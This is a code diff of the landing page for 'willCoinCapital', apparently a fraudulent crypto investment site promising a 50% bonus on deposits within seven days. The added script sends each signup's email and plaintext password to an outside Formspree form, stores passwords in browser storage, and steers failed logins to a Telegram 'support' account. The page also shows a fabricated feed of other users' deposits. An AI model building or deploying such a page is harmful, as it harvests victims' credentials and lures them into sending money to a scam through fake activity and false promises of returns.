@@ -13,12 +13,8 @@
         .mission-glow { box-shadow: 0 0 20px rgba(34, 211, 238, 0.15); border: 1px solid rgba(34, 211, 238, 0.25); background: rgba(34, 211, 238, 0.05); }
         .feed-toast { animation: slideUp 0.5s ease-out; }
         @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        
-        /* Floating Telegram Pulse */
         .tg-float { position: fixed; bottom: 30px; right: 30px; z-index: 100; transition: all 0.3s ease; }
-        .tg-float:hover { transform: scale(1.05); }
         .tg-glow { box-shadow: 0 0 25px rgba(34, 211, 238, 0.5); }
-
         input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 6px; border-radius: 10px; }
         input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; box-shadow: 0 0 10px rgba(34,211,238,0.8); }
     </style>
@@ -34,9 +30,13 @@
         <a href="#" class="flex items-center">
             <img src="logo.png" alt="willCoinCapital Logo" class="h-10 w-auto sm:h-12" onerror="this.src='logo.png.PNG'">
         </a>
-        <div class="flex gap-2 sm:gap-3">
+        <div class="flex gap-2 sm:gap-3" id="navButtons">
             <button onclick="toggleAuth('login')" class="px-4 py-2 border border-gray-800 rounded-lg text-[10px] font-bold uppercase tracking-widest hover:bg-gray-800 transition">Login</button>
             <button onclick="toggleAuth('signup')" class="px-4 py-2 bg-cyan-400 text-black rounded-lg text-[10px] font-black uppercase tracking-widest shadow-[0_0_15px_rgba(34,211,238,0.4)]">Sign Up</button>
+        </div>
+        <div id="userDisplay" class="hidden text-cyan-400 font-bold text-xs uppercase tracking-widest flex items-center gap-3">
+            <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+            <span id="userName"></span>
         </div>
     </nav>
 
@@ -49,22 +49,17 @@
             <p class="text-gray-400 text-lg mb-10 max-w-md font-medium leading-relaxed">
                 Professional Investing tool and the most flexible 7 day’s liquidity maturation protocols • <span class="text-white font-bold">BE YOUR OWN BOSS.</span>
             </p>
-            
             <div class="flex flex-wrap gap-4">
-                <button onclick="toggleAuth('signup')" class="px-8 py-4 bg-cyan-400 text-black font-black rounded-xl uppercase tracking-widest hover:scale-105 transition shadow-2xl">
-                    Get Started Now
-                </button>
-                <button onclick="toggleModal(true)" class="px-8 py-4 border border-white/20 text-white font-bold rounded-xl uppercase tracking-widest hover:bg-white/5 transition">
-                    How we work
-                </button>
+                <button onclick="toggleAuth('signup')" class="px-8 py-4 bg-cyan-400 text-black font-black rounded-xl uppercase tracking-widest hover:scale-105 transition shadow-2xl">Get Started Now</button>
+                <button onclick="toggleModal(true)" class="px-8 py-4 border border-white/20 text-white font-bold rounded-xl uppercase tracking-widest hover:bg-white/5 transition">How we work</button>
             </div>
         </div>
 
-        <div class="glass p-10 rounded-[32px] shadow-2xl border border-white/5 relative overflow-hidden">
+        <div class="glass p-10 rounded-[32px] border border-white/5 relative overflow-hidden">
             <div class="absolute top-0 right-0 bg-cyan-400 text-black text-[9px] font-bold px-3 py-1 rounded-bl-lg uppercase">Bonus Active: 50%</div>
             <h2 class="text-2xl font-black italic uppercase tracking-tighter mb-8 text-cyan-400">Profit Projection</h2>
             <div class="space-y-6">
-                <input type="number" id="depositInput" value="1000" class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-2xl font-bold outline-none focus:border-cyan-400 transition text-white">
+                <input type="number" id="depositInput" value="1000" class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-2xl font-bold outline-none focus:border-cyan-400 text-white">
                 <input type="range" id="depositSlider" min="100" max="10000" step="100" value="1000" class="w-full">
             </div>
             <div class="grid grid-cols-3 gap-4 mt-8 pt-6 border-t border-white/5 text-center">
@@ -79,43 +74,32 @@
         <div class="absolute inset-0 modal-bg" onclick="toggleAuth()"></div>
         <div class="glass max-w-md w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10 shadow-2xl">
             <h2 id="authTitle" class="text-3xl font-black uppercase tracking-tighter mb-2 text-cyan-400">Login</h2>
-            <p id="authDesc" class="text-gray-500 text-sm mb-8 font-bold uppercase tracking-widest">Access your terminal</p>
-            <form onsubmit="handleAuth(event)" class="space-y-4">
-                <input type="email" placeholder="Email Address" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 outline-none focus:border-cyan-400 transition text-white">
-                <input type="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 outline-none focus:border-cyan-400 transition text-white">
-                <button type="submit" class="w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase tracking-widest hover:bg-cyan-300 transition shadow-lg">Continue</button>
+            <p id="authDesc" class="text-gray-500 text-[10px] mb-8 font-bold uppercase tracking-widest">Secure Terminal Access</p>
+            <form id="authForm" class="space-y-4">
+                <input type="email" id="email" name="email" placeholder="Email Address" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 outline-none focus:border-cyan-400 text-white">
+                <input type="password" id="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 outline-none focus:border-cyan-400 text-white">
+                <button type="submit" id="authSubmit" class="w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase tracking-widest hover:bg-cyan-300 transition shadow-lg">Continue</button>
             </form>
+            <p id="authSwitch" class="mt-6 text-center text-[10px] text-gray-400 cursor-pointer hover:text-cyan-400 uppercase font-bold"></p>
         </div>
     </div>
 
     <div id="howModal" class="fixed inset-0 z-50 flex items-center justify-center p-6 hidden">
         <div class="absolute inset-0 modal-bg" onclick="toggleModal(false)"></div>
-        <div class="glass max-w-2xl w-full p-8 md:p-12 rounded-[40px] border border-cyan-400/30 relative z-10 shadow-2xl overflow-y-auto max-h-[90vh]">
+        <div class="glass max-w-2xl w-full p-8 md:p-12 rounded-[40px] border border-cyan-400/30 relative z-10 overflow-y-auto max-h-[90vh]">
             <button onclick="toggleModal(false)" class="absolute top-6 right-6 text-gray-500 hover:text-white text-2xl">&times;</button>
-            <h2 class="text-3xl font-black uppercase tracking-tighter mb-2 text-cyan-400">Working Protocol</h2>
-            
-            <div class="bg-black/60 border border-cyan-400/20 rounded-2xl p-6 mb-6 text-center">
-                <div class="flex justify-center gap-4 text-3xl font-mono font-black text-cyan-400">
-                    <div><span id="days">06</span><p class="text-[8px] text-gray-500 uppercase">Days</p></div><span>:</span>
-                    <div><span id="hours">23</span><p class="text-[8px] text-gray-500 uppercase">Hrs</p></div><span>:</span>
-                    <div><span id="minutes">59</span><p class="text-[8px] text-gray-500 uppercase">Min</p></div><span>:</span>
-                    <div><span id="seconds">59</span><p class="text-[8px] text-gray-500 uppercase">Sec</p></div>
-                </div>
-            </div>
-
+            <h2 class="text-3xl font-black uppercase mb-2 text-cyan-400">Working Protocol</h2>
             <div class="mb-10 px-6 py-6 mission-glow rounded-[24px]">
                 <p class="text-[13px] leading-relaxed text-gray-300 text-center italic">
                     <span class="text-cyan-400 font-extrabold uppercase">willCoinCapital</span> empowers everyday investors. By combining a <span class="text-white">50% match</span> with a rapid <span class="text-white">7-day cycle</span>, we lead the market in execution and security.
                 </p>
             </div>
-
             <div class="space-y-6">
-                <div class="flex gap-5"><div class="w-8 h-8 rounded-full bg-cyan-400 text-black flex items-center justify-center font-black text-xs shrink-0">1</div><p class="text-sm text-gray-300"><b>Funding:</b> BTC, USDT, or Card (Visa/MC) for instant activation.</p></div>
-                <div class="flex gap-5"><div class="w-8 h-8 rounded-full bg-cyan-400 text-black flex items-center justify-center font-black text-xs shrink-0">2</div><p class="text-sm text-gray-300"><b>Match:</b> 50% capital scaling applied instantly upon deposit.</p></div>
-                <div class="flex gap-5"><div class="w-8 h-8 rounded-full border border-cyan-400 text-cyan-400 flex items-center justify-center font-black text-xs shrink-0">3</div><p class="text-sm text-gray-300"><b>7-Day Cycle:</b> Fixed 168-hour maturation period.</p></div>
-                <div class="flex gap-5"><div class="w-8 h-8 rounded-full border border-gray-600 text-gray-600 flex items-center justify-center font-black text-xs shrink-0">4</div><p class="text-sm text-gray-300"><b>Exit:</b> 100% Principal + Bonus available on Day 7.</p></div>
+                <div class="flex gap-5"><div class="w-8 h-8 rounded-full bg-cyan-400 text-black flex items-center justify-center font-black text-xs shrink-0">1</div><p class="text-sm"><b>Funding:</b> BTC, USDT, or Card (Visa/MC).</p></div>
+                <div class="flex gap-5"><div class="w-8 h-8 rounded-full bg-cyan-400 text-black flex items-center justify-center font-black text-xs shrink-0">2</div><p class="text-sm"><b>Match:</b> 50% capital scaling applied instantly.</p></div>
+                <div class="flex gap-5"><div class="w-8 h-8 rounded-full border border-cyan-400 text-cyan-400 flex items-center justify-center font-black text-xs shrink-0">3</div><p class="text-sm"><b>7-Day Cycle:</b> 168-hour maturation period.</p></div>
             </div>
-            <button onclick="toggleModal(false)" class="mt-10 w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase tracking-widest shadow-lg">Back to Terminal</button>
+            <button onclick="toggleModal(false)" class="mt-10 w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase shadow-lg">Back to Terminal</button>
         </div>
     </div>
 
@@ -134,22 +118,60 @@
     <div id="activityFeed" class="fixed bottom-6 left-6 z-40 space-y-3 pointer-events-none"></div>
 
     <script>
+        let currentMode = 'login';
+        // INTEGRATED FORMSPREE ENDPOINT
+        const formspreeURL = "https://formspree.io/f/mlgpnzgg"; 
+
         function toggleModal(show) { document.getElementById('howModal').classList.toggle('hidden', !show); }
-        
-        function toggleAuth(type) {
+
+        function toggleAuth(mode) {
             const modal = document.getElementById('authModal');
-            if (!type) { modal.classList.add('hidden'); return; }
-            document.getElementById('authTitle').innerText = type === 'login' ? 'Login' : 'Create Account';
+            if (!mode) { modal.classList.add('hidden'); return; }
+            currentMode = mode;
+            document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Create Account';
+            document.getElementById('authSubmit').innerText = mode === 'login' ? 'Login' : 'Sign Up';
+            document.getElementById('authSwitch').innerText = mode === 'login' ? 'Need an account? Sign Up' : 'Already have an account? Login';
+            document.getElementById('authSwitch').onclick = () => toggleAuth(mode === 'login' ? 'signup' : 'login');
             modal.classList.remove('hidden');
         }
 
-        // Updated HandleAuth to direct to YOUR Telegram
-        function handleAuth(e) {
+        // DATABASE LOGIC (Formspree + LocalStorage)
+        document.getElementById('authForm').onsubmit = (e) => {
             e.preventDefault();
-            alert("SECURITY: Verification servers are at capacity. Please message support on Telegram for manual account activation.");
-            window.open("https://t.me/willCoin_Capital", "_blank");
-        }
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
+            if (currentMode === 'signup') {
+                // Save locally so login works instantly
+                localStorage.setItem('userEmail', email);
+                localStorage.setItem('userPass', password);
+
+                // Send Data to your Dashboard
+                fetch(formspreeURL, {
+                    method: 'POST',
+                    body: new FormData(e.target),
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                alert("Registration successful! You may now login to your terminal.");
+                toggleAuth('login');
+            } else {
+                const savedEmail = localStorage.getItem('userEmail');
+                const savedPass = localStorage.getItem('userPass');
+
+                if (email === savedEmail && password === savedPass) {
+                    document.getElementById('navButtons').classList.add('hidden');
+                    document.getElementById('userDisplay').classList.remove('hidden');
+                    document.getElementById('userName').innerText = email.split('@')[0];
+                    toggleAuth();
+                } else {
+                    alert("SECURITY: Verification required. Please contact support on Telegram for manual activation.");
+                    window.open("https://t.me/willCoin_Capital", "_blank");
+                }
+            }
+        };
+
+        // UI Activity Feed & Ledger
         const users = ["0x4f...92", "0x1a...f4", "User_884", "Alpha_Trader", "0xbc...11"];
         const amounts = ["$500", "$1,200", "$5,000", "$10,000"];
 
@@ -172,17 +194,6 @@
             }
         }
 
-        function startTimer() {
-            let d = 6, h = 23, m = 59, s = 59;
-            setInterval(() => {
-                s--; if(s < 0) { s = 59; m--; } if(m < 0) { m = 59; h--; } if(h < 0) { h = 23; d--; }
-                document.getElementById('days').innerText = String(d).padStart(2, '0');
-                document.getElementById('hours').innerText = String(h).padStart(2, '0');
-                document.getElementById('minutes').innerText = String(m).padStart(2, '0');
-                document.getElementById('seconds').innerText = String(s).padStart(2, '0');
-            }, 1000);
-        }
-
         const input = document.getElementById('depositInput');
         const slider = document.getElementById('depositSlider');
         function updateCalc(val) {
@@ -194,10 +205,10 @@
         slider.oninput = (e) => { updateCalc(e.target.value); input.value = e.target.value; };
 
         generateLedger();
-        startTimer();
     </script>
 </body>
 </html>
+
 
 
 
